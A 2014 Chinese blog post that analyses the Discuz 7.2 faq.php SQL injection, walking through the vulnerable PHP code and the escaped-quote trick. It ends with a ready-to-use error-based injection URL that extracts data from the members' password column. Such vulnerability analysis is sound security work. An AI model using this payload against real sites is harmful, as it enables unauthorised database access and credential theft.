Title: Diz7.2 faq漏洞代码深入分析
Date: 2014-07-05 10:25
Tags: code

当得知diz7.2漏洞时，查看官方补丁，看见修改 `$gids = Array()`，当时以为只是一个变量覆盖的问题，今天仔细的研究了一下源代码，果真是卧虎藏龙啊。也给了我深深的启发，看问题不能只看表面，需要沉下去，细细品味。费话少说，请看下面分析。

在dz中，GET的数据都会被全局进行addslashes转义，把一些预定字符前加\，所以一般的变量覆盖问题也很难引起注入漏洞。什么原因呢，请看下面关键代码片段

#### **1、关键片段源码**

**1.片段一：**

	$groups = $grouplist = array();

**2.片段二：**

	$groupids = array();
	foreach($gids as $row) {
		$groupids[] = $row[0];
	}

**3.片段三：**

	$query = $db->query("SELECT * FROM {$tablepre}usergroups u LEFT JOIN {$tablepre}admingroups a ON u.groupid=a.admingid WHERE u.groupid IN (".implodeids($groupids).")");


**4.片段四：**

    function implodeids($array) {
	    if(!empty($array)) {
		    return "'".implode("','", is_array($array) ? $array : array($array))."'";
	    } else {
		    return '';
	    }
    }

#### **2、关键片段功能分析**

**1.片段一：**

初始化变量，但这里并没有初始化gids变量，url中传递此变量可以覆盖

**2.片段二：**

取数组gids变量的每个成员的第一个字符，当gids被赋值为`$gids=('12','23','34')`时，groupids就会被赋值为`$groupids=('1','2','3')`，但就是这样所以才出现了问题。

当url中传递gids中包含一个单引号是，经过addslashes转义后就会加上一个\，当前gid就会变为`$gids=('12','\'','34')`，groupids就会被赋值为`$groupids=('1','\','3')`。

可以看出此处的处理导致引入了一个转义的字符。

**3.片段三：**

执行sql语句查询，此处理查询使用了groupids变量，注意变量前后都有符号“()”,并且是在in语句内

**4.片段四：**

将数组分解成一个字符串，每个成员之间使用逗号相连使得in的语句变成`in ('1','\','3')`，本来应该是三个参数的，由于存在一个转义符，此语句只有2个参数1和`',`而后面的`3'`是多余的。

此处如果我们控制`3`的话，就能注入，当`3`为`) and (select 1) %23`，in语句就会变成`in ('1','\',') and select 1 %23')`。

很明显使用`)`闭合了前面的一个`(`，使用`%23`注释掉后面的单引号。注入语句`select 1`得到执行


#### **3、mysql报错注入法**

由于能够控制输入让sql执行，可以使用mysql的报错注入法，使用group by与rand的组合即可爆出数据库的内容，形式如下。还有几种报错法，可以根据原理自由发挥。
    
    faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat((select%20count(password)%20from%20cdb_members%20limit 1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23





